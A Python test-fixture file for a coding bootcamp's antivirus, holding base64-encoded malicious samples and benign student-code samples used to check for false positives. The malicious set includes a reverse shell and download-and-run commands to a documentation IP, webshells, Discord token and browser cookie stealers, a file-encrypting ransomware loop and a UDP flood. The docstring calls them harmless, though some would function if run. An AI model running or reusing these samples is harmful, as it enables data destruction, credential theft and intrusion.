"""Banco de muestras para probar el antivirus de CódigoCamp (pruebas automáticas y botón «Probar antivirus» del panel).

Las muestras «peligrosas» son INOFENSIVAS: imitan las huellas que dejan los virus reales (cómo se ven por dentro) pero no
hacen nada; las direcciones son de documentación (203.0.113.x, ejemplo.invalid). Las «normales» son código típico de un
estudiante que el antivirus NO debe bloquear (falsos positivos).
"""
import base64
import io
import struct
import zipfile
import zlib


def _png(extra=b""):
    def trozo(tipo, datos):
        return struct.pack(">I", len(datos)) + tipo + datos + struct.pack(">I", zlib.crc32(tipo + datos) & 0xFFFFFFFF)
    ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
    return b"\x89PNG\r\n\x1a\n" + trozo(b"IHDR", ihdr) + trozo(b"IDAT", zlib.compress(b"\x00\xff\x00\x00")) + trozo(b"IEND", b"") + extra


def _zip(archivos, cifrado=()):
    b = io.BytesIO()
    with zipfile.ZipFile(b, "w") as z:
        for nombre, datos in archivos.items():
            z.writestr(zipfile.ZipInfo(nombre), datos)
    datos = bytearray(b.getvalue())
    if cifrado:   # se marca «con contraseña» en las cabeceras (zipfile no escribe zips cifrados)
        for firma, desplazamiento in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
            i = datos.find(firma)
            while i != -1:
                datos[i + desplazamiento] |= 0x1
                i = datos.find(firma, i + 4)
    return bytes(datos)


OLE = b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + b"\x00" * 504
LNK = b"L\x00\x00\x00\x01\x14\x02\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00F" + b"\x00" * 60
FIRMA_PRUEBA = b"CodigoCamp: archivo de prueba de la lista de virus conocidos (inofensivo).\n"

# (nombre del archivo, contenido en base64, qué imita). Van en base64 para que el antivirus de tu PC (Windows Defender…)
# no confunda este archivo de pruebas con un virus de verdad; se decodifican al importar.
_PELIGROSAS_B64 = [
    ('eicar.com.txt', 'WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=', 'Archivo de prueba EICAR (firma estándar de los antivirus)'),
    ('conocido.dat', 'Q29kaWdvQ2FtcDogYXJjaGl2byBkZSBwcnVlYmEgZGUgbGEgbGlzdGEgZGUgdmlydXMgY29ub2NpZG9zIChpbm9mZW5zaXZvKS4K', 'Archivo de la lista de virus conocidos (huella SHA-256)'),
    ('foto.jpg', 'TVqQAAMAAABUaGlzIHByb2dyYW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=', 'Programa de Windows disfrazado de foto'),
    ('factura.pdf', 'TAAAAAEUAgAAAAAAwAAAAAAAAEYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=', 'Acceso directo (.lnk) disfrazado de PDF'),
    ('instalar.ps1', 'JHU9J2h0dHA6Ly8yMDMuMC4xMTMuNS9hLnBzMScKSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCR1KQo=', 'PowerShell que descarga y ejecuta código'),
    ('limpiar.bat', 'QGVjaG8gb2ZmCnZzc2FkbWluIGRlbGV0ZSBzaGFkb3dzIC9hbGwgL3F1aWV0CmJjZGVkaXQgL3NldCB7ZGVmYXVsdH0gcmVjb3ZlcnllbmFibGVkIG5vCg==', 'Script de secuestro de datos (borra las copias de seguridad)'),
    ('arranque.bat', 'cmVnIGFkZCBIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biAvdiB1cGQgL2QgQzpcVXNlcnNcUHVibGljXHVwZC5leGUgL2YK', 'Se instala para arrancar solo con Windows (persistencia)'),
    ('bajar.cmd', 'Y2VydHV0aWwgLXVybGNhY2hlIC1zcGxpdCAtZiBodHRwOi8vMjAzLjAuMTEzLjUveC5leGUgJVRFTVAlXHguZXhlCg==', 'Descarga un programa con certutil (técnica de virus)'),
    ('conectar.sh', 'IyEvYmluL2Jhc2gKYmFzaCAtaSA+JiAvZGV2L3RjcC8yMDMuMC4xMTMuNS80NDQ0IDA+JjEK', 'Shell reversa en Bash (control remoto)'),
    ('cron.sh', 'KGNyb250YWIgLWw7IGVjaG8gIkByZWJvb3QgY3VybCAtcyBodHRwOi8vMjAzLjAuMTEzLjUveCB8IHNoIikgfCBjcm9udGFiIC0K', 'Se reinstala en cada arranque descargando un script'),
    ('ocultar.ps1', 'cG93ZXJzaGVsbCAtbm9wIC13IGhpZGRlbiAtZW5jIFNRQkZBRmdBSUFBb0FFNEFaUUIzQUMwQVR3QmlBR29BWlFCakFIUUFLUUE9Cg==', 'PowerShell con comando oculto (codificado)'),
    ('shell.php', 'PD9waHAgZXZhbCgkX1BPU1RbJ2MnXSk7ID8+', 'Webshell PHP (ejecuta lo que le manden desde internet)'),
    ('cmd.php', 'PD9waHAgaWYoaXNzZXQoJF9HRVRbJ3gnXSkpeyBzeXN0ZW0oJF9HRVRbJ3gnXSk7IH0gPz4=', 'Webshell PHP con system()'),
    ('panel.php', 'PD9waHAgJGY9JF9SRVFVRVNUWydmJ107ICRmKCRfUkVRVUVTVFsnYSddKTsgPz4=', 'Webshell PHP con función variable'),
    ('servidor.js', 'Y29uc3QgeyBleGVjIH0gPSByZXF1aXJlKCdjaGlsZF9wcm9jZXNzJyk7CmFwcC5nZXQoJy9yJywgKHJlcSwgcmVzKSA9PiBleGVjKHJlcS5xdWVyeS5jbWQsIChlLCBvKSA9PiByZXMuc2VuZChvKSkpOwo=', 'Servidor Node que ejecuta comandos que llegan por la URL'),
    ('app.py', 'ZnJvbSBmbGFzayBpbXBvcnQgcmVxdWVzdAppbXBvcnQgb3MKQGFwcC5yb3V0ZSgnL3gnKQpkZWYgeCgpOgogICAgcmV0dXJuIG9zLnBvcGVuKHJlcXVlc3QuYXJnc1snYyddKS5yZWFkKCkK', 'Servidor Python que ejecuta comandos que llegan por la URL'),
    ('tokens.py', 'aW1wb3J0IG9zLCByZSwgcmVxdWVzdHMKcnV0YSA9IG9zLmdldGVudignQVBQREFUQScpICsgJ1xcZGlzY29yZFxcTG9jYWwgU3RvcmFnZVxcbGV2ZWxkYicKZm9yIGYgaW4gb3MubGlzdGRpcihydXRhKToKICAgIHQgPSByZS5maW5kYWxsKHInW1x3LV17MjR9XC5bXHctXXs2fVwuW1x3LV17Mjd9Jywgb3BlbihydXRhICsgJ1xcJyArIGYsIGVycm9ycz0naWdub3JlJykucmVhZCgpKQogICAgcmVxdWVzdHMucG9zdCgnaHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMS9hYmMnLCBqc29uPXsnY29udGVudCc6IHN0cih0KX0pCg==', 'Ladrón de sesiones de Discord que las envía por internet'),
    ('cookies.py', 'aW1wb3J0IHNxbGl0ZTMsIHdpbjMyY3J5cHQsIHJlcXVlc3RzCmRiID0gc3FsaXRlMy5jb25uZWN0KHInQzpcVXNlcnNcYVxBcHBEYXRhXExvY2FsXEdvb2dsZVxDaHJvbWVcVXNlciBEYXRhXERlZmF1bHRcTmV0d29ya1xDb29raWVzJykKZm9yIG4sIHYgaW4gZGIuZXhlY3V0ZSgnc2VsZWN0IG5hbWUsIGVuY3J5cHRlZF92YWx1ZSBmcm9tIGNvb2tpZXMnKToKICAgIHAgPSB3aW4zMmNyeXB0LkNyeXB0VW5wcm90ZWN0RGF0YSh2KQpyZXF1ZXN0cy5wb3N0KCdodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTIzOmFiYy9zZW5kRG9jdW1lbnQnLCBmaWxlcz17J2QnOiBvcGVuKCdjLnR4dCcsJ3JiJyl9KQo=', 'Ladrón de contraseñas del navegador que las envía por Telegram'),
    ('cifrar.py', 'aW1wb3J0IG9zCmZyb20gY3J5cHRvZ3JhcGh5LmZlcm5ldCBpbXBvcnQgRmVybmV0CmsgPSBGZXJuZXQoRmVybmV0LmdlbmVyYXRlX2tleSgpKQpmb3IgciwgZCwgZnMgaW4gb3Mud2FsaygnQzovVXNlcnMnKToKICAgIGZvciBmIGluIGZzOgogICAgICAgIHAgPSBvcy5wYXRoLmpvaW4ociwgZikKICAgICAgICBvcGVuKHAgKyAnLmxvY2tlZCcsICd3YicpLndyaXRlKGsuZW5jcnlwdChvcGVuKHAsICdyYicpLnJlYWQoKSkpCiAgICAgICAgb3MucmVtb3ZlKHApCg==', 'Virus de secuestro de datos (cifra todo y borra los originales)'),
    ('LEEME.txt', 'wqFUb2RvcyB0dXMgYXJjaGl2b3MgaGFuIHNpZG8gY2lmcmFkb3MhIFBhcmEgcmVjdXBlcmFybG9zIGVudsOtYSAwLjA1IGJpdGNvaW4gYSBlc3RhIGJpbGxldGVyYTogYmMxcWV4YW1wbGUu', 'Nota de rescate de un ransomware'),
    ('persistir.py', 'aW1wb3J0IHdpbnJlZwprID0gd2lucmVnLk9wZW5LZXkod2lucmVnLkhLRVlfQ1VSUkVOVF9VU0VSLCByJ1NvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1bicsIDAsIHdpbnJlZy5LRVlfU0VUX1ZBTFVFKQp3aW5yZWcuU2V0VmFsdWVFeChrLCAndXBkJywgMCwgd2lucmVnLlJFR19TWiwgcidDOlxVc2Vyc1xQdWJsaWNcdXBkLmV4ZScpCg==', 'Programa que se instala para arrancar solo (persistencia)'),
    ('bajador.js', 'dmFyIHMgPSBuZXcgQWN0aXZlWE9iamVjdCgnV1NjcmlwdC5TaGVsbCcpOwp2YXIgeCA9IG5ldyBBY3RpdmVYT2JqZWN0KCdNU1hNTDIuWE1MSFRUUCcpOwp4Lm9wZW4oJ0dFVCcsICdodHRwOi8vMjAzLjAuMTEzLjUvYS5leGUnLCBmYWxzZSk7IHguc2VuZCgpOwp2YXIgc3QgPSBuZXcgQWN0aXZlWE9iamVjdCgnQURPREIuU3RyZWFtJyk7IHN0Lk9wZW4oKTsgc3QuVHlwZSA9IDE7IHN0LldyaXRlKHgucmVzcG9uc2VCb2R5KTsgc3QuU2F2ZVRvRmlsZSgnYS5leGUnLCAyKTsKcy5SdW4oJ2EuZXhlJyk7Cg==', 'Script de Windows que descarga y abre un programa'),
    ('flood.py', 'aW1wb3J0IHNvY2tldCwgcmFuZG9tCnMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULCBzb2NrZXQuU09DS19ER1JBTSkKd2hpbGUgVHJ1ZToKICAgIHMuc2VuZHRvKHJhbmRvbS5fdXJhbmRvbSgxMDI0KSwgKCcyMDMuMC4xMTMuNScsIDgwKSkK', 'Ataque de denegación de servicio (inunda a otro servidor)'),
    ('oculto.py', 'aW1wb3J0IGJhc2U2NApleGVjKGJhc2U2NC5iNjRkZWNvZGUoJ2NISnBiblFvSjJodmJHRW5LUT09JykpCg==', 'Código escondido en base64 que se ejecuta'),
    ('minero.js', 'Y29uc3QgcG9vbCA9ICdzdHJhdHVtK3RjcDovL3Bvb2wuZWplbXBsby5pbnZhbGlkOjMzMzMnOwo=', 'Minero de criptomonedas'),
    ('perfil.png', 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAIAAACQd1PeAAAADElEQVR4nGP4z8AAAAMBAQDJ/pLvAAAAAElFTkSuQmCCPD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOyA/Pg==', 'Imagen con un programa PHP escondido al final'),
    ('logo.svg', 'PHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnPjxzY3JpcHQ+ZmV0Y2goJy8vMjAzLjAuMTEzLjUvP2M9Jytkb2N1bWVudC5jb29raWUpPC9zY3JpcHQ+PC9zdmc+', 'Imagen SVG con código que roba la sesión'),
    ('contrato.pdf', 'JVBERi0xLjQKMSAwIG9iajw8L1R5cGUvQ2F0YWxvZy9PcGVuQWN0aW9uIDIgMCBSPj5lbmRvYmoKMiAwIG9iajw8L1MvSmF2YVNjcmlwdC9KUyhhcHAubGF1bmNoVVJMKCdodHRwOi8vMjAzLjAuMTEzLjUnKSk+PmVuZG9iagolJUVPRg==', 'PDF que ejecuta JavaScript al abrirse'),
    ('pago.pdf', 'JVBERi0xLjQKMSAwIG9iajw8L1R5cGUvQ2F0YWxvZy9PcGVuQWN0aW9uPDwvUy9MYXVuY2gvRihjbWQuZXhlKT4+Pj5lbmRvYmoKJSVFT0Y=', 'PDF que intenta abrir un programa'),
    ('raro.pdf', 'JVBERi0xLjQKMSAwIG9iajw8L1R5cGUvQ2F0YWxvZy9PcGVuQWN0aW9uIDIgMCBSPj5lbmRvYmoKMiAwIG9iajw8L1MvSiM2MXZhU2NyaXB0L0pTKHgpPj5lbmRvYmoKJSVFT0Y=', 'PDF con JavaScript disfrazado (#61)'),
    ('informe.docx', 'UEsDBBQAAAAAAAAAIQDHHBc8CAAAAAgAAAATAAAAW0NvbnRlbnRfVHlwZXNdLnhtbDxUeXBlcy8+UEsDBBQAAAAAAAAAIQDdWoYNDQAAAA0AAAARAAAAd29yZC9kb2N1bWVudC54bWw8dzpkb2N1bWVudC8+UEsDBBQAAAAAAAAAIQDOIQm0EQIAABECAAATAAAAd29yZC92YmFQcm9qZWN0LmJpbtDPEeChsRrhAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQXR0cmlidXRlIFZCX05hbWVQSwECFAMUAAAAAAAAACEAxxwXPAgAAAAIAAAAEwAAAAAAAAAAAAAAgAEAAAAAW0NvbnRlbnRfVHlwZXNdLnhtbFBLAQIUAxQAAAAAAAAAIQDdWoYNDQAAAA0AAAARAAAAAAAAAAAAAACAATkAAAB3b3JkL2RvY3VtZW50LnhtbFBLAQIUAxQAAAAAAAAAIQDOIQm0EQIAABECAAATAAAAAAAAAAAAAACAAXUAAAB3b3JkL3ZiYVByb2plY3QuYmluUEsFBgAAAAADAAMAwQAAALcCAAAAAA==', 'Documento de Word con macros escondidas (.docx con vbaProject)'),
    ('plantilla.docx', 'UEsDBBQAAAAAAAAAIQDHHBc8CAAAAAgAAAATAAAAW0NvbnRlbnRfVHlwZXNdLnhtbDxUeXBlcy8+UEsDBBQAAAAAAAAAIQDdWoYNDQAAAA0AAAARAAAAd29yZC9kb2N1bWVudC54bWw8dzpkb2N1bWVudC8+UEsDBBQAAAAAAAAAIQAc/8o4wwAAAMMAAAAcAAAAd29yZC9fcmVscy9zZXR0aW5ncy54bWwucmVsczxSZWxhdGlvbnNoaXBzPjxSZWxhdGlvbnNoaXAgVHlwZT0naHR0cDovL3NjaGVtYXMub3BlbnhtbGZvcm1hdHMub3JnL29mZmljZURvY3VtZW50LzIwMDYvcmVsYXRpb25zaGlwcy9hdHRhY2hlZFRlbXBsYXRlJyBUYXJnZXQ9J2h0dHA6Ly8yMDMuMC4xMTMuNS90LmRvdG0nIFRhcmdldE1vZGU9J0V4dGVybmFsJy8+PC9SZWxhdGlvbnNoaXBzPlBLAQIUAxQAAAAAAAAAIQDHHBc8CAAAAAgAAAATAAAAAAAAAAAAAACAAQAAAABbQ29udGVudF9UeXBlc10ueG1sUEsBAhQDFAAAAAAAAAAhAN1ahg0NAAAADQAAABEAAAAAAAAAAAAAAIABOQAAAHdvcmQvZG9jdW1lbnQueG1sUEsBAhQDFAAAAAAAAAAhABz/yjjDAAAAwwAAABwAAAAAAAAAAAAAAIABdQAAAHdvcmQvX3JlbHMvc2V0dGluZ3MueG1sLnJlbHNQSwUGAAAAAAMAAwDKAAAAcgEAAAAA', 'Word que descarga una plantilla con macros desde internet'),
    ('dde.docx', 'UEsDBBQAAAAAAAAAIQDHHBc8CAAAAAgAAAATAAAAW0NvbnRlbnRfVHlwZXNdLnhtbDxUeXBlcy8+UEsDBBQAAAAAAAAAIQAowooWYgAAAGIAAAARAAAAd29yZC9kb2N1bWVudC54bWw8dzpkb2N1bWVudD48dzpmbGRTaW1wbGUgdzppbnN0cj0nRERFQVVUTyBjOlxcd2luZG93c1xcc3lzdGVtMzJcXGNtZC5leGUgIi9rIGNhbGMiJy8+PC93OmRvY3VtZW50PlBLAQIUAxQAAAAAAAAAIQDHHBc8CAAAAAgAAAATAAAAAAAAAAAAAACAAQAAAABbQ29udGVudF9UeXBlc10ueG1sUEsBAhQDFAAAAAAAAAAhACjCihZiAAAAYgAAABEAAAAAAAAAAAAAAIABOQAAAHdvcmQvZG9jdW1lbnQueG1sUEsFBgAAAAACAAIAgAAAAMoAAAAAAA==', 'Word con un campo DDE que ejecuta comandos'),
    ('notas.doc', '0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABfVkJBX1BST0pFQ1QAQXR0cmlidXRlIFZCX05hbWUgPSAiVGhpc0RvY3VtZW50Ig0KU3ViIEF1dG9PcGVuKCkNClNoZWxsICJjbWQgL2MgY2FsYyINCkVuZCBTdWINCg==', 'Documento .doc con macro que se ejecuta al abrir'),
    ('carta.rtf', 'e1xydGYxe1xvYmplY3Rcb2JqZW1iXG9ianVwZGF0ZXtcKlxvYmpjbGFzcyBFcXVhdGlvbi4zfXtcKlxvYmpkYXRhIDAxMDUwMDAwMDIwMDAwMDB9fX0=', 'RTF con objeto incrustado (exploit de Office)'),
    ('tareas.zip', 'UEsDBBQAAAAAAAAAIQCI+aBvBAAAAAQAAAAPAAAAdGFyZWEvUkVBRE1FLm1kaG9sYVBLAwQUAAAAAAAAACEAGckbqkUAAABFAAAAEgAAAHRhcmVhL2luc3RhbGFyLnBzMUlFWCAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygnaHR0cDovLzIwMy4wLjExMy41L2EnKVBLAQIUAxQAAAAAAAAAIQCI+aBvBAAAAAQAAAAPAAAAAAAAAAAAAACAAQAAAAB0YXJlYS9SRUFETUUubWRQSwECFAMUAAAAAAAAACEAGckbqkUAAABFAAAAEgAAAAAAAAAAAAAAgAExAAAAdGFyZWEvaW5zdGFsYXIucHMxUEsFBgAAAAACAAIAfQAAAKYAAAAAAA==', 'Comprimido con un script dañino dentro'),
    ('secreto.zip', 'UEsDBBQAAQAAAAAAIQADimKsMgAAADIAAAANAAAAZG9jdW1lbnRvLnBkZnh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4UEsBAhQDFAABAAAAAAAhAAOKYqwyAAAAMgAAAA0AAAAAAAAAAAAAAIABAAAAAGRvY3VtZW50by5wZGZQSwUGAAAAAAEAAQA7AAAAXQAAAAAA', 'Comprimido con contraseña (no se puede revisar por dentro)'),
    ('login.html', 'PGZvcm0gYWN0aW9uPSdodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90MTIzOmFiYy9zZW5kTWVzc2FnZScgbWV0aG9kPSdwb3N0Jz48aW5wdXQgbmFtZT0ndSc+PGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwJz48YnV0dG9uPkVudHJhcjwvYnV0dG9uPjwvZm9ybT4=', 'Página falsa de inicio de sesión que envía la contraseña por Telegram'),
]
PELIGROSAS = [(n, base64.b64decode(d), q) for n, d, q in _PELIGROSAS_B64]

NORMALES = [
    ("app.py", b"from flask import Flask, request, jsonify\napp = Flask(__name__)\n@app.post('/sumar')\ndef sumar():\n    d = request.get_json()\n    return jsonify(r=d['a'] + d['b'])\n"),
    ("chat_servidor.py", b"import socket\ns = socket.socket()\ns.bind(('0.0.0.0', 5000))\ns.listen()\nc, a = s.accept()\nc.send(b'hola')\n"),
    ("cliente.py", b"import socket\ns = socket.socket()\ns.connect(('localhost', 5000))\nprint(s.recv(1024))\n"),
    ("proceso.py", b"import subprocess\nr = subprocess.run(['git', 'status'], capture_output=True, text=True)\nprint(r.stdout)\n"),
    ("listar.py", b"import os\nfor raiz, carpetas, archivos in os.walk('.'):\n    print(raiz, len(archivos))\n"),
    ("cifrado_tarea.py", b"from cryptography.fernet import Fernet\nk = Fernet.generate_key()\nf = Fernet(k)\nprint(f.decrypt(f.encrypt(b'hola')))\n"),
    ("decodificar.py", b"import base64\nprint(base64.b64decode('aG9sYQ==').decode())\n"),
    ("formulario.php", b"<?php $n = htmlspecialchars($_POST['nombre'] ?? ''); echo \"Hola $n\";\n$st = $db->prepare('SELECT * FROM u WHERE id=?'); $st->execute([$_GET['id']]); ?>"),
    ("servidor.js", b"const express = require('express');\nconst { exec } = require('child_process');\nexec('git status', (e, o) => console.log(o));\n"
                    b"const app = express(); app.get('/', (req, res) => res.send('hola ' + req.query.nombre)); app.listen(3000);\n"),
    ("build.sh", b"#!/bin/bash\nset -e\nrm -rf build/ dist/\nnpm ci && npm run build\ncurl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -\n"),
    ("tareas.ps1", b"Get-ChildItem -Recurse *.log | Sort-Object Length | Select-Object -First 5\nRemove-Item .\\build -Recurse -Force\n"),
    ("menu.bat", b"@echo off\necho Hola mundo\nset /p n=Tu nombre: \necho Bienvenido %n%\npause\n"),
    ("login.html", b"<form action='/login' method='post'><input name='usuario'><input type='password' name='clave'><button>Entrar</button></form>\n<script>console.log('hola')</script>"),
    ("icono.svg", b"<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 10 10'><circle cx='5' cy='5' r='4' fill='teal'/></svg>"),
    ("foto.png", _png()),
    ("tarea.pdf", b"%PDF-1.4\n1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n2 0 obj<</Type/Pages/Kids[]/Count 0>>endobj\n%%EOF"),
    ("ensayo.docx", _zip({"[Content_Types].xml": "<Types/>", "word/document.xml": "<w:document><w:t>Mi ensayo</w:t></w:document>"})),
    ("proyecto.zip", _zip({"proyecto/main.py": "print('hola')", "proyecto/bin/app.exe": "MZ compilado", "proyecto/README.md": "# Proyecto"})),
    ("bot.py", b"import requests\nWEBHOOK = 'https://discord.com/api/webhooks/1/abc'\nrequests.post(WEBHOOK, json={'content': 'El servidor se reinici\xc3\xb3'})\n"),
    ("api.py", b"import requests, time\nwhile True:\n    print(requests.get('https://api.github.com').status_code)\n    time.sleep(60)\n"),
    ("cripto.md", "Bitcoin es una criptomoneda. Los archivos cifrados con AES necesitan la clave para leerse.".encode()),
    ("calculadora.js", b"const r = eval('2 + 3');\nconsole.log(r);\n"),
    ("registro.py", b"import winreg\nk = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r'Control Panel\\Desktop')\nprint(winreg.QueryValueEx(k, 'Wallpaper'))\n"),
]
